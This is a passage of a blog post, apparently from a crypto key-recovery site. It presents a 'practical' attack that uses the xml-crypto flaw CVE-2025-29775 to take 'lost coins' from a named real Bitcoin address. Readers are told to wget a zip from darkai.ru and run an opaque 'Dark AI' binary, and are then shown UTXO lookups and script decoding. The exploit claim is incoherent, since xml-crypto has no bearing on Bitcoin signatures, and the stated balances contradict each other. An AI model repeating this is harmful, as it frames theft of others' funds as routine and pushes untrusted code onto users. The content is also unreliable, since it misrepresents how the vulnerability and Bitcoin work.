<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#practical-part"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>From the theory of vulnerability&nbsp;&nbsp;<strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29775">CVE-2025-29775</a></strong>&nbsp;&nbsp;it is known that an attacker can process an unupdated&nbsp;<strong><a href="https://github.com/keyhunters/xml-crypto">xml-crypto</a></strong>&nbsp;library for incorrect transaction values. Let’s move on to the practical part of the article and consider an example using a Bitcoin wallet:&nbsp;&nbsp;<strong><a href="https://btc1.trezor.io/address/32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe">32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</a></strong>&nbsp;, where there were lost coins in the amount of:&nbsp;&nbsp;<strong>0.059672 BTC</strong>&nbsp;&nbsp;as of July 2025 this amount is:&nbsp;&nbsp;<strong>7,&nbsp;052&nbsp;USD</strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a target="_blank" rel="noreferrer noopener" href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-16-1024x45.png"></a><a href="https://btc1.trezor.io/tx/791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf"><strong>791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>Let’s consider the format:&nbsp;<a href="https://btc1.trezor.io/tx/791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf">Raw transaction</a>&nbsp;binary and hex data that contain all the information about&nbsp;<a href="https://btc1.trezor.io/tx/791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf">the transaction</a>&nbsp;. It is needed to transmit, verify or create transactions at a low level and is the basis for the operation of the entire Bitcoin network. Regular users rarely encounter&nbsp;<a href="https://btc1.trezor.io/tx/791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf">Raw transactions</a>&nbsp;directly, but for developers and crypto enthusiasts, this is the main tool for full control over all transactions of the Bitcoin network.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-17.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-17.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/tx/791fe035d312dcf9196b48649a5c9a027198f623c0a5f5bd4cc311b8864dd0cf">Raw Transaction</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>To fully return UTXO objects in the Bitcoin network, we will use the&nbsp;<a href="https://darkai.ru/"><strong>Dark AI</strong></a>&nbsp;tool . UTXO is the main part of the data structure in the blockchain and represents the amount of BTC coins of the cryptocurrency that can be spent by the holder of the private key (controlling this Bitcoin address). Each UTXO is the output of a specific past transaction, which has never been used as an input in subsequent transactions.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/DarkAI_Logo-1024.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/DarkAI_Logo-1024.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://colab.research.google.com/drive/1eaKZitRzN8034hIwivLNSawobDpcmoEm"></a><a href="https://colab.research.google.com/drive/1TKrJ0bKsNgc72H9UvzpCnh2YPmRsyPdW"></a><a href="https://colab.research.google.com/drive/1TKrJ0bKsNgc72H9UvzpCnh2YPmRsyPdW">Google Colab</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#google-colab"></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://colab.research.google.com/drive/1TKrJ0bKsNgc72H9UvzpCnh2YPmRsyPdW"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-1-1024x593.png" alt="Private key Debug: Incorrect generation of private keys, system vulnerabilities and errors in calculating the order of the elliptic curve secp256k1 threats to the Bitcoin ecosystem"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://colab.research.google.com/drive/1TKrJ0bKsNgc72H9UvzpCnh2YPmRsyPdW"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://colab.research.google.com/drive/1TKrJ0bKsNgc72H9UvzpCnh2YPmRsyPdW
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1. Download and install the&nbsp;<a href="https://darkai.ru/"><strong>Dark AI tool</strong></a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#1-download-and-install-thedark-ai-tool"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5 class="wp-block-heading" id="user-content-detailed-description-of-all-terminal-commands-and"><a href="https://colab.research.google.com/drive/1TKrJ0bKsNgc72H9UvzpCnh2YPmRsyPdW">Detailed description of all terminal commands and actions</a></h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#detailed-description-of-all-terminal-commands-and-actions"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Teams:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!wget https://darkai.ru/repositories/neuralnet_tools.zip</strong></code></pre>
<!-- /wp:code -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code><strong>wget</strong></code>— a command line utility for downloading files from the network via HTTP, HTTPS and FTP protocols.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>We download  the archive by specifying <strong>the URL</strong> .<code><strong><a href="https://darkai.ru/">n<strong>euralnet_tool</strong>s.zip</a></strong></code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code><strong>unzip</strong></code>— command to extract ZIP archives in the current directory.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>This command extracts all files from&nbsp;<strong><code><strong>neuralnet_tools.zip</strong></code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!unzip neuralnet_tools.zip</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-24.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-24.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Let’s run the command&nbsp;<code>ls</code>&nbsp;for quick and easy viewing</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>ls</strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-25.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-25.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. Launch the&nbsp;<a href="https://darkai.ru/"><strong>Dark AI tool</strong></a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#2-launch-thedark-ai-tool"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./darkai</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-26-1024x73.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-26-1024x73.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Let’s run the command to get information about the so-called&nbsp;<em>unspent transaction outputs</em>&nbsp;(&nbsp;<a href="https://keyhunters.ru/creating-a-bitcoin-rawtx-transaction-with-positive-balance-using-broadcast-bitcoin-transaction/">UTXO</a>&nbsp;, decoding:&nbsp;<a href="https://keyhunters.ru/creating-a-bitcoin-rawtx-transaction-with-positive-balance-using-broadcast-bitcoin-transaction/">Unspent Transaction Output</a>&nbsp;) for the specified Bitcoin address. This information is important for assessing the balance of the address and the possibility of conducting new transactions.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./darkai -bitcoinaddress 32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">As a result, two UTXO objects were returned:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#as-a-result-two-utxo-objects-were-returned"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>&#91;  {'output': '8602122a7044b8795b5829b6b48fb1960a124f42ab1c003e769bbaad31cb2afd:0', 'value': 677200},  {'output': 'bd992789fd8cff1a2e515ce2c3473f510df933e1f44b3da6a8737630b82d0786:0', 'value': 5000000}]</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong>Each UTXO contains:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>output</strong> — output identifier. Format: <code>&lt;txid>:&lt;n></code>, where <code>&lt;txid></code>is a unique transaction hash, and <code>&lt;n></code> is the output number in the list of outputs for this transaction.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>value</strong> — amount in satoshis (1 bitcoin = 100,000,000 satoshis).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Data decoding:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#data-decoding"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>First UTXO</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Exit:</strong> <code>8602122a7044b8795b5829b6b48fb1960a124f42ab1c003e769bbaad31cb2afd:0</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Amount:</strong> 677,200 satoshis</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Second UTXO</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Exit:</strong> <code>bd992789fd8cff1a2e515ce2c3473f510df933e1f44b3da6a8737630b82d0786:0</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Amount:</strong> 5,000,000 satoshis</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Overall balance</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#overall-balance"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The total available balance of an address is equal to the sum of all found UTXOs:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>677 200 + 5 000 000 = <strong>5 677 200 satoshis</strong></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>In terms of bitcoins: 5,677,200/100,000,000 = 0.05677200 BTC</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-11.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-11.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Technical Interpretation with Dark AI</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#technical-interpretation-with-dark-ai"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>We use the interpretation process to process the unupdated&nbsp;<strong><a href="https://github.com/keyhunters/xml-crypto">xml-crypto</a></strong>&nbsp;library to create invalid transaction values and send a large amount, the Dark AI algorithm will choose which UTXO to use (or combine both).</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Sending funds:</strong> All specified UTXOs can be used as inputs when forming a new transaction, which will allow you to spend all or part of your balance.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Transparency:</strong> This report confirms that the address contains real Bitcoin funds and can be used to verify authenticity and solvency.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>The Bitcoin address&nbsp;<code><strong>32GkPB9XjMAELR4Q2Hr31Jdz2tntY18zCe</strong></code>has two active UTXOs totaling&nbsp;<strong>0.05677200 BTC</strong>&nbsp;. These funds can be used to make new transactions; both outputs are considered confirmed and unspent.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-28-1024x36.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-28-1024x36.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Deserialization of Bitcoin transaction</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#deserialization-of-bitcoin-transaction"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>To get fragments of information about the output of a Bitcoin transaction, use the following commands, where the first output (&nbsp;<code>outs</code>) from the transaction has a unique identifier<code>8602122a7044b8795b5829b6b48fb1960a124f42ab1c003e769bbaad31cb2afd</code></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./darkai -deserialize 8602122a7044b8795b5829b6b48fb1960a124f42ab1c003e769bbaad31cb2afd</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">We get the structure of the response of the deserialization result:</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#we-get-the-structure-of-the-response-of-the-deserialization-result"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>{'value': 677200, 'script': 'a91406612b7cb2027e80ec340f9e02ffe4a9a59ba76287'}</code></pre>
<!-- /wp:code -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>value:</strong> 677200 — the amount of this output is expressed in satoshi (1 BTC = 100,000,000 satoshi).</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>script:</strong> <code>a91406612b7cb2027e80ec340f9e02ffe4a9a59ba76287</code> — a script that defines the conditions for spending this output.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Detailed explanation of elements:&nbsp;<em>Value field</em></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#detailed-explanation-of-elementsvalue-field"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Value:</strong> 677,200 satoshi.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This amount can be spent when creating the corresponding transaction if the conditions of the script are met.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Equivalent:</strong> 677,200/100,000,000 = 0.00677200 BTC.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-10.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-10.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Detailed explanation of elements:&nbsp;<em>Script field</em></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#detailed-explanation-of-elementsscript-field"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Script meaning:</strong> <code>a91406612b7cb2027e80ec340f9e02ffe4a9a59ba76287</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This is <strong>a script of type “scriptPubKey”</strong> – part of the transaction output structure that specifies who can spend these funds. The most important purpose is to ensure security and control over the disposal of funds.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Decoding the script</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#decoding-the-script"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The script starts with a prefix <code>a914...87</code>, which corresponds to the <strong>P2SH (Pay to Script Hash)</strong> format :<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>a9</code>— OP_HASH160 <em>(hash operator)</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>14</code>— length of the next value <em>(20 bytes = 40 hex characters)</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>06612b7cb2027e80ec340f9e02ffe4a9a59ba762</code>— hash160 Bitcoin itself Wallet addresses where BTC coins are stored.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>87</code>— OP_EQUAL <em>(a basic Bitcoin Script command operator that implements a comparison of two pieces of data to verify their identity)</em></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This means that the recipient can spend the funds if they provide a script whose hash matches the value provided and provide valid signatures for that script.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Practical significance of the result</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#practical-significance-of-the-result"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>This output of the specified transaction contains 677,200 satoshi (0.00677200 BTC), which is protected by a P2SH type script.</strong></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>To spend funds from such an output, you will need to know the original script and present the correct signatures – a typical situation for multi-signature wallets, smart contracts and other advanced security schemes.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This information is important for analyzing the structure of the transaction, verifying the purpose of the funds, and understanding the requirements for their subsequent use.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Deserialize a transaction by identifier</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#deserialize-a-transaction-by-identifier"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>As a result of deserialization of the transaction by identifier,&nbsp;<code>8602122a7044b8795b5829b6b48fb1960a124f42ab1c003e769bbaad31cb2afd</code>the first output was obtained, containing the amount of&nbsp;<strong>677,200 satoshi</strong>&nbsp;(0.00677200 BTC), protected by&nbsp;<strong>a P2SH script</strong>&nbsp;. To manage these funds, it will be necessary to present the destination script and correctly sign the unlocking transaction that meets the conditions of the specified hash.</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Digital-Signature-Forgery-Attack/blob/main/Digital_Signature_Forgery_Attack/image-29-1024x34.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Digital-Signature-Forgery-Attack/raw/main/Digital_Signature_Forgery_Attack/image-29-1024x34.png" alt="Digital Signature Forgery Attack: How CVE-2025-29774 Vulnerabilities and the SIGHASH_SINGLE Bug Threaten Multi-Signature Wallets Methods of Operations with Fake RawTX"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Deserialization of the second Bitcoin transaction</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#deserialization-of-the-second-bitcoin-transaction"></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>To get fragments of information about the output of the original data (&nbsp;<code>output</code>) of a Bitcoin transaction, apply the following commands, where the first output (&nbsp;<code>outs</code>) from the transaction with a unique identifier&nbsp;<code>bd992789fd8cff1a2e515ce2c3473f510df933e1f44b3da6a8737630b82d0786</code></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./darkai -deserialize bd992789fd8cff1a2e515ce2c3473f510df933e1f44b3da6a8737630b82d0786</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Using the interpretation process, with the help of&nbsp;<a href="https://darkai.ru/">Dark AI</a>&nbsp;using the deserialization function, we then obtain information about the structure of the first output element (&nbsp;<code>output</code>) for the second transaction with the identifier<br><code>bd992789fd8cff1a2e515ce2c3473f510df933e1f44b3da6a8737630b82d0786</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><br><strong>Result:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>{'value': 5000000, 'script': 'a91406612b7cb2027e80ec340f9e02ffe4a9a59ba76287'}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1. Detailed explanation of elements:&nbsp;&nbsp;<em>Value field</em></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Digital-Signature-Forgery-Attack#1-detailed-explanation-of-elementsvalue-field"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Content:</strong> <code>5000000</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>This value is expressed in satoshi</strong> , the smallest indivisible unit of bitcoin; 1 BTC = 100,000,000 satoshi.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Purpose:</strong><br>This amount is associated with a specific transaction output specified in the array elements <code>'outs'</code>. It can only be spent if the conditions written in the script defined in the field are met <code>'script'</code>.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Bitcoin conversion:</strong> 5,000,000 satoshi = 0.05 BTC</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image {"linkDestination":"custom"} -->
